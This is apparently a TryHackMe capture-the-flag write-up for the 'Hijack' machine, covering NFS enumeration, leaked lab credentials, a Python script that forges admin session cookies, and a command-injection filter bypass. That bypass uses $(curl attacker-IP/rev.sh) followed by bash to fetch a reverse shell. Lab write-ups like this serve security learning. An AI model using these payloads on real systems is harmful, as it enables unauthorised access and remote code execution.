<h3> Hijack TryHackMe </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f4519c5a-bf39-44bd-989a-195f14153a0c)

Been long since I did a machine from TryHackMe but recently a friend of mine showed me this box so I decided to do it today

First thing first as always is enumeration

I started with an nmap scan and on doing so got me this available tcp ports open
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f87e8f09-67ae-40d2-b363-df0a3f251814)

Ok cool we have ftp, ssh, http and nfs open

Checking the mounts on nfs shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9cbe16a7-bd94-4af9-b594-cc3e375308df)

So anyone can mount the share on `/mnt/share`

I mounted it and saw this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c244adfe-248f-4ee3-9d4c-d0df276b74c1)

```
- mkdir mnt
- sudo mount -t nfs 10.10.38.234:/mnt/share mnt
```

Well we can't access the mounted share cause our user & group id isn't `1003` but `1001`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/096ae2e0-424f-4142-9298-836923711705)

To solve that I just changed the value from my `/etc/passwd` file (but u can actually create a dummy account and make the uid/gid 1003 then delete when done ...... as for me i'm too lazy to do that)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/32dc459d-a804-457e-b8c2-9f8af0fe0268)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f30871f0-fe8a-4822-bc7d-5ab6a1831519)

```
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
```

Cool we have the ftp credentials now we can unmount the share and continue enumeration
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b28b3bc2-13e9-42e2-9192-4f32c31c5a22)

Let us check ftp shall we?
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a9598e72-db0f-4502-b673-de6a8cc40f6b)

That seems to be like a user directory and also two non default files are there (which are hidden) 

After transferring it to my host I checked it's content and got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/26fd23bf-0b0c-4dce-a5d3-ab513dfbadf7)

```
➜  Hijack cat .from_admin.txt 
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
➜  Hijack
```

From this note we can tell there's a user called `admin` and he made a password list containing safe passwords. Also he says something to the user `rick` about rate limiting login attempts inorder to prevent future brute force attack

Cool so let's move to the webapp

One thing we can try here is to attempt brute force on ssh for user `admin / rick / root` with the password list but that won't work :P

Time to move to the webapp 

![giphy](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/09557d16-86b1-4eaf-834e-ec228f5613f5)

Going over to port 80 which is the webserver shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/58fae9ca-5379-40a8-a7ee-d715a04062bd)

So we can either login or create account

To save us the trouble of stress I just created an account
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/acd32ee8-8000-4d1f-83fc-508b12e7e482)

Now we can login with the credential `mud:password`

One thing you'd immediately notice is the `Administration` panel 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fba37f5b-b7aa-4b45-a391-1267433727ea)

If you click that you'd see this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/181bbdb4-03f8-4d64-abce-7be6898894b3)

So we need to be logged in as admin before we can access that

Often when webapp checks this kind of permission it either gets it from a database or it can be the cookie 

Since we have no sort of database access here I checked the cookie and saw this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bd98d584-a07d-43ab-a9b8-9b5f4ef25d78)

Normally when I see `PHPSESSID` as the cookie name I don't really check it because it's usually some random value but that isn't the case here
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ee5af735-fbb5-441b-8d6e-17610f0caeea)

From cyberchef we can see that it decoded from base64 and has `admin` + `:` + some_hash_value

Using [crackstation](https://crackstation.net/) the hash decoded to `password` and I got the hash type to be `MD5`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6f1f459d-5286-4ca1-ba89-f091a239d39e)

At this point we can either do two things:
- Brute force the admin account
- Do some cookie forgery till we get the right admin cookie session

The first case won't be of benefit to us as there's going to be rate limit according to the note from admin 

But the other case will work cause the rate limit is just placed on the login page but not the amount of time you access the web page which makes sense

Now inorder to do that we need to convert `admin:{md5_of_password}` to base64 then make a `GET` request to `/` and if we get a content length which differs from the preceding one then we have our right session

I wrote a python script to do that:

```python
import requests
import hashlib
from base64 import b64encode as encode

url = "http://10.10.182.53/index.php"

with open("passwords.txt", 'r') as fp:
    for password in fp:
        passwd = password.strip('\n').encode()
        hash = hashlib.md5(passwd).hexdigest()
        value = f"admin:{hash}"
        payload = encode(value.encode())
        cookie = {"PHPSESSID": payload.decode()}
        req = requests.get(url, cookies=cookie)
        
        if len(req.text) != 487:
            print(f"Potential Cookie: {payload.decode()}")
            break
```

After running it I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a9042b0c-a755-44d1-be8d-37b3539c7d80)

```
➜  Hijack python3 check.py
Potential Cookie: YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=
➜  Hijack
```

Now we can change the cookie to that and should be logged in as admin
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/574d00ce-0b6a-4eb4-a0d9-dba14c716239)

Cool let us access the administrator panel
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9420e836-d8a0-46fc-b06f-feb34c254174)

That claims to do a service check on the provided service name

I put `apache` since that's currently running and it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f6434c93-9c0e-4937-a940-31016f972937)

This tells us that it is likely running a bash command with our argument provided

This means we can try inject our own command leading to command injection

I first tried the generic payload `;` and got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/607e756f-7866-42d4-b3e6-68dfaaabd0bd)

```
Command injection detected, please provide a service.
```

Fancy! This can be bypassed easily using `$(command)`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/295f54d7-ea98-4b9e-85ad-ddca20bd2818)

So I just got a reverse shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6a307f94-9fa3-45d5-a3f0-9c40a7c983b0)

```
- $(curl 10.6.80.113/rev.sh -o /tmp/a)
- $(bash /tmp/a)
```

In the current directory of the web app shows a configuration file which holds mysql credential
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9a556c0a-d549-4193-aeb7-0f3807b9e83a)

Using the password worked for user `rick` and we can now grab the user flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/46ef276a-6fd6-451d-b8b6-adbc49675955)

```
rick:N3v3rG0nn4G1v3Y0uUp
```



![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cc9766c7-0691-4712-b222-8c1f12bf0e5b)
